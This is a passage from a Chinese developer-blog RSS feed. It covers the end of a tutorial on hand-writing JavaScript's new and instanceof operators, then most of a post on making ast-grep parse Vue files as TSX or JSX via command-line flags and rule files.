            <span class="hljs-attr">status</span>: response.<span class="hljs-property">status</span>,
            <span class="hljs-attr">timestamp</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>()
        });
        
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[Analytics] Tracked request to <span class="hljs-subst">${response.url}</span>`</span>);
        <span class="hljs-keyword">return</span> { <span class="hljs-attr">tracked</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">totalRequests</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span>.<span class="hljs-property">length</span> };
    }
    
    <span class="hljs-title function_">getStats</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> {
            <span class="hljs-attr">totalRequests</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span>.<span class="hljs-property">length</span>,
            <span class="hljs-attr">successfulRequests</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">status</span> === <span class="hljs-number">200</span>).<span class="hljs-property">length</span>,
            <span class="hljs-attr">failedRequests</span>: <span class="hljs-variable language_">this</span>.<span class="hljs-property">requests</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">status</span> !== <span class="hljs-number">200</span>).<span class="hljs-property">length</span>
        };
    }
}

<span class="hljs-comment">// 使用插件系统</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'=== 插件系统测试 ==='</span>);

<span class="hljs-keyword">const</span> pluginSystem = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PluginSystem</span>();

<span class="hljs-keyword">try</span> {
    <span class="hljs-comment">// 注册插件</span>
    <span class="hljs-keyword">const</span> logger = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoggerPlugin</span>();
    <span class="hljs-keyword">const</span> analytics = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnalyticsPlugin</span>();
    
    pluginSystem.<span class="hljs-title function_">register</span>(logger);
    pluginSystem.<span class="hljs-title function_">register</span>(analytics);
    
    <span class="hljs-comment">// 触发钩子</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'触发 beforeRequest 钩子:'</span>);
    <span class="hljs-keyword">const</span> beforeResults = pluginSystem.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">'beforeRequest'</span>, { <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/data'</span>, <span class="hljs-attr">method</span>: <span class="hljs-string">'GET'</span> });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Before request results:'</span>, beforeResults);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'\n触发 afterResponse 钩子:'</span>);
    <span class="hljs-keyword">const</span> afterResults = pluginSystem.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">'afterResponse'</span>, { <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/data'</span>, <span class="hljs-attr">status</span>: <span class="hljs-number">200</span>, <span class="hljs-attr">data</span>: {} });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'After response results:'</span>, afterResults);
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'\n触发 onError 钩子:'</span>);
    <span class="hljs-keyword">const</span> errorResults = pluginSystem.<span class="hljs-title function_">trigger</span>(<span class="hljs-string">'onError'</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'Network error'</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Error results:'</span>, errorResults);
    
    <span class="hljs-comment">// 获取插件</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'\n插件检查:'</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Has logger plugin:'</span>, pluginSystem.<span class="hljs-title function_">hasPlugin</span>(<span class="hljs-string">'logger'</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Has analytics plugin:'</span>, pluginSystem.<span class="hljs-title function_">hasPlugin</span>(<span class="hljs-string">'analytics'</span>));
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'Has unknown plugin:'</span>, pluginSystem.<span class="hljs-title function_">hasPlugin</span>(<span class="hljs-string">'unknown'</span>));
    
    <span class="hljs-comment">// 获取统计信息</span>
    <span class="hljs-keyword">const</span> analyticsPlugin = pluginSystem.<span class="hljs-title function_">getPlugin</span>(<span class="hljs-string">'analytics'</span>);
    <span class="hljs-keyword">if</span> (analyticsPlugin <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">AnalyticsPlugin</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'\nAnalytics stats:'</span>, analyticsPlugin.<span class="hljs-title function_">getStats</span>());
    }
    
    <span class="hljs-comment">// 错误测试</span>
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'\n错误测试:'</span>);
    <span class="hljs-keyword">try</span> {
        pluginSystem.<span class="hljs-title function_">register</span>({}); <span class="hljs-comment">// 不是 Plugin 实例</span>
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'注册非插件错误:'</span>, error.<span class="hljs-property">message</span>);
    }
    
    <span class="hljs-keyword">try</span> {
        pluginSystem.<span class="hljs-title function_">register</span>(logger); <span class="hljs-comment">// 重复注册</span>
    } <span class="hljs-keyword">catch</span> (error) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'重复注册错误:'</span>, error.<span class="hljs-property">message</span>);
    }
} <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'插件系统错误:'</span>, error);
}
</code></pre>
<h4 data-id="heading-26">八、总结与最佳实践</h4>
<h5 data-id="heading-27">81 核心要点总结</h5>
<ol>
<li><strong>new操作符的执行步骤:</strong></li>
</ol>
<ul>
<li>创建新对象</li>
<li>设置原型链</li>
<li>绑定 this 值</li>
<li>执行构造函数</li>
<li>处理返回值</li>
</ul>
<ol start="2">
<li><strong>instanceof的工作原理:</strong></li>
</ol>
<ul>
<li>沿着原型链向上查找</li>
<li>比较构造函数的prototype属性</li>
<li>支持Symbol.hasInstance自定义检测</li>
</ul>
<ol start="3">
<li><strong>原型链的重要性:</strong></li>
</ol>
<ul>
<li>是实现继承的基础</li>
<li>影响 instanceof 的检测结果</li>
<li>决定了对象的属性和方法查找路径</li>
</ul>
<h5 data-id="heading-28">8.2 手写实现的关键点</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// new 操作符实现的关键</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) {
    <span class="hljs-comment">// 1. 创建对象并设置原型</span>
    <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
    
    <span class="hljs-comment">// 2. 执行构造函数</span>
    <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);
    
    <span class="hljs-comment">// 3. 处理返回值</span>
    <span class="hljs-keyword">return</span> result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span> ? result : obj;
}

<span class="hljs-comment">// instanceof 操作符实现的关键</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myInstanceof</span>(<span class="hljs-params">instance, Constructor</span>) {
    <span class="hljs-comment">// 1. 基本类型直接返回 false</span>
    <span class="hljs-keyword">if</span> (instance === <span class="hljs-literal">null</span> || <span class="hljs-keyword">typeof</span> instance !== <span class="hljs-string">'object'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
    }
    
    <span class="hljs-comment">// 2. 获取原型链</span>
    <span class="hljs-keyword">let</span> proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(instance);
    <span class="hljs-keyword">const</span> prototype = <span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>;
    
    <span class="hljs-comment">// 3. 沿着原型链查找</span>
    <span class="hljs-keyword">while</span> (proto !== <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (proto === prototype) {
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
        }
        proto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(proto);
    }
    
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h5 data-id="heading-29">8.3 最佳实践</h5>
<ol>
<li><strong>使用new操作符时:</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 好的实践</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-keyword">if</span> (!(<span class="hljs-variable language_">this</span> <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>)) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(name); <span class="hljs-comment">// 防止忘记使用 new</span>
    }
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 或者使用 ES6 class</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    }
}
</code></pre>
<ol start="2">
<li><strong>使用instanceof时:</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 好的实践 - 检查类型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>) {
        <span class="hljs-comment">// 处理数组</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span>) {
        <span class="hljs-comment">// 处理日期</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">RegExp</span>) {
        <span class="hljs-comment">// 处理正则表达式</span>
    }
}

<span class="hljs-comment">// 更好的实践 - 使用鸭子类型</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">process</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(value)) {
        <span class="hljs-comment">// 处理数组</span>
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Date</span> || <span class="hljs-keyword">typeof</span> value.<span class="hljs-property">getMonth</span> === <span class="hljs-string">'function'</span>) {
        <span class="hljs-comment">// 处理日期</span>
    }
}
</code></pre>
<ol start="3">
<li><strong>避免的问题:</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 避免的问题1: 修改内置对象的原型</span>
<span class="hljs-title class_">Array</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">customMethod</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {};
<span class="hljs-keyword">const</span> arr = [];
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(arr.<span class="hljs-property">customMethod</span>); <span class="hljs-comment">// function</span>

<span class="hljs-comment">// 避免的问题2: 跨框架的 instanceof 问题</span>
<span class="hljs-comment">// 在不同 iframe 中创建的数组，instanceof 可能返回 false</span>

<span class="hljs-comment">// 避免的问题3: constructor 被修改</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>();
person.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Object</span>;
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// true</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">Person</span>); <span class="hljs-comment">// false</span>
</code></pre>
<h5 data-id="heading-30">8.4 性能考虑</h5>
<ol>
<li><strong>new操作符的性能:</strong></li>
</ol>
<ul>
<li>原生的<code>new</code>操作符是最快的</li>
<li>手写实现会有轻微性能开销</li>
<li>在性能关键路径上使用原生操作</li>
</ul>
<ol start="2">
<li><strong>instanceof的性能:</strong></li>
</ol>
<ul>
<li>原型链越长，检测越慢</li>
<li>对于频繁的类型检测，可以考虑缓存结果</li>
<li>使用<code>typeof</code>检测基本类型更快</li>
</ul>
<ol start="3">
<li><strong>优化建议:</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 优化频繁的类型检测</span>
<span class="hljs-keyword">const</span> isArray = <span class="hljs-title class_">Array</span>.<span class="hljs-property">isArray</span>;

<span class="hljs-keyword">function</span> <span class="hljs-title function_">processItems</span>(<span class="hljs-params">items</span>) {
    <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isArray</span>(items)) {
        <span class="hljs-comment">// 处理数组</span>
        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; items.<span class="hljs-property">length</span>; i++) {
            <span class="hljs-comment">// 使用 for 循环而不是 forEach</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-31">结语</h4>
<p>通过手写<code>new</code>操作符和<code>instanceof</code>操作符，我们深入理解了JavaScript的对象创建机制和类型检测原理。这些知识不仅是面试中的常见考点，更是编写高质量JavaScript代码的基础。</p>
<p>记住以下要点:</p>
<ul>
<li>✅ new 操作符创建对象时，会设置原型链并执行构造函数</li>
<li>✅ instanceof 通过检查原型链来判断对象类型</li>
<li>✅ 原型链是 JavaScript 继承的基础</li>
<li>✅ 理解这些原理有助于避免常见的陷阱和错误</li>
</ul>
<p><strong>延伸阅读:</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2Fnew" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/new" ref="nofollow noopener noreferrer">MDN: new 操作符</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FOperators%2Finstanceof" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Operators/instanceof" ref="nofollow noopener noreferrer">MDN: instanceof 操作符</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fgetify%2FYou-Dont-Know-JS%2Fblob%2F1st-ed%2Fthis%252520%252526%252520object%252520prototypes%2Fch5.md" target="_blank" title="https://github.com/getify/You-Dont-Know-JS/blob/1st-ed/this%2520%2526%2520object%2520prototypes/ch5.md" ref="nofollow noopener noreferrer">JavaScript 原型链详解</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FClasses" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Classes" ref="nofollow noopener noreferrer">ES6 Class 与原型继承</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让 ast-grep 听你的：指定语言解析 Vue/TSX/JSX 全流程]]></title>    <link>https://juejin.cn/post/7581098720034373672</link>    <guid>https://juejin.cn/post/7581098720034373672</guid>    <pubDate>2025-12-08T07:03:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581098720034373672" data-draft-id="7581098720034340904" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让 ast-grep 听你的：指定语言解析 Vue/TSX/JSX 全流程"/> <meta itemprop="keywords" content="前端,后端,JavaScript"/> <meta itemprop="datePublished" content="2025-12-08T07:03:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="火车叼位"/> <meta itemprop="url" content="https://juejin.cn/user/1345457960792808"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让 ast-grep 听你的：指定语言解析 Vue/TSX/JSX 全流程
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1345457960792808/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    火车叼位
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T07:03:05.000Z" title="Mon Dec 08 2025 07:03:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>接上一篇博客: <a href="https://juejin.cn/post/7579819594270785574" target="_blank" title="https://juejin.cn/post/7579819594270785574">ast-grep：结构化搜索与重构利器ast-grep 的主要论点是在文本 grep 与重量级 AST 工具之间建立一座 - 掘金</a></p>
<p>在多语言项目里，文件扩展名未必等于想要的解析语法：比如 <code>.vue</code> 内嵌 <code>&lt;script setup lang="tsx"&gt;</code>，但默认解析器可能把整文件当成 Vue 语法，导致 TS/TSX 规则匹配不到。ast-grep 提供两条路可以“强制”指定解析语言：</p>
<ol>
<li>命令行临时指定 <code>--lang</code>；</li>
<li>在规则/配置文件里用 <code>language</code> 覆盖。
本文给出可直接复用的命令、配置示例，以及在 Vue/Pug 场景下的避坑方案。</li>
</ol>
<h2 data-id="heading-0">方法一：命令行临时指定语言</h2>
<p>适合一次性查询或快速验证模式。</p>
<h3 data-id="heading-1">基本用法</h3>
<pre><code class="hljs language-bash" lang="bash">sg run --lang tsx -p <span class="hljs-string">'defineProps($P)'</span> src/views/yufukuan/Yufukuan.vue
</code></pre>
<ul>
<li><code>--lang tsx</code>：强制把输入文件按 TSX 解析，即使扩展名是 <code>.vue</code>。</li>
<li><code>-p 'defineProps($P)'</code>：模式示例，可替换成任意 TS/TSX 语法模式。</li>
</ul>
<h3 data-id="heading-2">如果模板干扰解析</h3>
<ul>
<li>现有 tree-sitter-vue 对 <code>lang="pug"</code> 模板不做 AST 解析，命令会把模板当作文本，可能触发 ERROR。</li>
<li>解决思路：
<ol>
<li>仅喂 <code>&lt;script&gt;</code> 部分：先用脚本提取 <code>&lt;script&gt;</code>，再通过 stdin 传给 sg。
<pre><code class="hljs language-bash" lang="bash">node -e <span class="hljs-string">"const fs=require('fs');const txt=fs.readFileSync('src/views/yufukuan/Yufukuan.vue','utf8');const m=txt.match(/&lt;script[\\s\\S]*?&lt;\\/script&gt;/);if(m)process.stdout.write(m[0]);"</span> \
  | sg run --lang tsx --stdin -p <span class="hljs-string">'defineProps($P)'</span>
</code></pre>
</li>
<li>临时改模板为普通 HTML（不改需求时就别这么做），确认解析器可工作后再回滚。</li>
</ol>
</li>
</ul>
<h3 data-id="heading-3">只想做文本级匹配</h3>
<p>如果解析器对模板报错，可以降级用模板严格度或纯文本：</p>
<pre><code class="hljs language-bash" lang="bash">sg run --lang vue --strictness template -p <span class="hljs-string">'handlerEditInst'</span> src/views/**/*.vue
</code></pre>
<p>这不会给出 AST 结构，但可在 VSCode/CLI 内快速找关键词。</p>
<h2 data-id="heading-4">方法二：在规则/配置里指定语言</h2>
<p>适合需要多次复用的规则或集成到 <code>sg scan</code> 的场景。</p>
<h3 data-id="heading-5">规则文件示例</h3>
<p>新建规则 <code>rules/vue-script-tsx.yml</code>：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">vue-script-tsx-define-props</span>
<span class="hljs-attr">language:</span> <span class="hljs-string">tsx</span>            <span class="hljs-comment"># 这里强制按 TSX 解析</span>
<span class="hljs-attr">rule:</span>
  <span class="hljs-attr">pattern:</span> <span class="hljs-string">"defineProps($P)"</span>
</code></pre>
<p>要让规则只作用于指定路径，可以配合 <code>files</code> 或在运行时用 <code>--globs</code>：</p>
<pre><code class="hljs language-bash" lang="bash">sg scan --config sgconfig.yml --globs <span class="hljs-string">"src/**/*.vue"</span> --rules vue-script-tsx-define-props
</code></pre>
<p>说明：</p>
<ul>
<li><code>language</code> 字段覆盖扩展名默认解析器。</li>
<li>模式仍需符合该语言语法；若模板残留会导致 ERROR，可结合“只喂脚本”或在规则里增加条件过滤。</li>
</ul>
<h3 data-id="heading-6">针对 JS/JSX 的示例</h3>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">id:</span> <span class="hljs-string">vue-script-jsx-import-check</span>
<span class="hljs-attr">language:</span> <span class="hljs-string">jsx</span>
<span class="hljs-attr">rule:</span>
  <span class="hljs-attr">pattern:</span> <span class="hljs-string">"import $A from '$B'"</span>
</code></pre>
<p>运行：</p>
<pre><code class="hljs language-bash" lang="bash">sg scan --config sgconfig.yml --globs <span class="hljs-string">"src/**/*.vue"</span> --rules vue-script-jsx-import-check
</code></pre>
<h2 data-id="heading-7">常见问题与处理</h2>
<ul>
<li>“Pattern contains an ERROR node”：
<ul>
<li>解析器在遇到模板/非目标语法时产生错误。尝试提取 <code>&lt;script&gt;</code> 后再解析，或临时移除 Pug 语法测试。</li>
</ul>
</li>
<li>“matched nothing” 且无错误：
<ul>
<li>确认模式语法合法；用 <code>--debug-query=pattern</code> 查看解析结果。</li>
</ul>
</li>
<li>VSCode 插件无结果但 CLI 正常：
<ul>
<li>VSCode 也依赖同一解析器，对 Pug/TSX 一样受限。可在插件里用文本模式，或等待支持更好的解析器。</li>
</ul>
</li>
</ul>
<h2 data-id="heading-8">实操建议（Vue 项目）</h2>
<ol>
<li>先在 CLI 验证：
<pre><code class="hljs language-bash" lang="bash">sg run --lang tsx -p <span class="hljs-string">'defineProps($P)'</span> src/views/foo.vue
</code></pre>
</li>
<li>若模板导致 ERROR，先用脚本提取 <code>&lt;script&gt;</code> 再搜。</li>
<li>需要重复用的查询，写进 <code>rules/*.yml</code>，加上 <code>language: tsx/js/jsx</code>，通过 <code>sg scan --globs "src/**/*.vue"</code> 运行。</li>
<li>如果必须结构化解析模板层（Pug），要么把模板改为 HTML，要么寻找/自建支持 Pug 的 Vue 解析器重新编译 <code>vue.so</code>。</li>
</ol>
<h2 data-id="heading-9">结语</h2>
